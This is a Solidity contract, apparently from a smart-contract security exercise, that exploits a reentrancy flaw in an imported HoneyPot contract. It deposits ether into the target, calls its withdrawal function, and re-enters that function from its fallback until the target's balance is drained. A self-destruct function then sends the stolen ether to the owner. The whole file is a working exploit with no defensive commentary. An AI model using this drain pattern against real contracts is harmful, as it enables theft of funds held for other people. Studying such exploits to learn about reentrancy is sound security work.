pragma solidity 0.4.24;

import "./HoneyPot.sol";

contract HoneyProcessor {
    HoneyPot honeyPot;
    address owner;
    
    function HoneyProcessor(address hp){
        honeyPot = HoneyPot(hp);
        owner = msg.sender;
    }
    
    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }
    
    function equip() payable public{
        require(honeyPot.balance%msg.value == 0);
        honeyPot.put.value(msg.value)();
    }
    
    function attack() public {
        honeyPot.get();
    }
    
    function getContBalance() public returns(uint) {
        return honeyPot.balance;
    }
    
    /* This function should be called by the contract owner once
       the target contract is flushed out of all ethers */
    function destruct() onlyOwner {
        selfdestruct(msg.sender);
    }
    
    function() public payable {
        if(honeyPot.balance != 0){
            honeyPot.get();
        }
        
    }
   
}

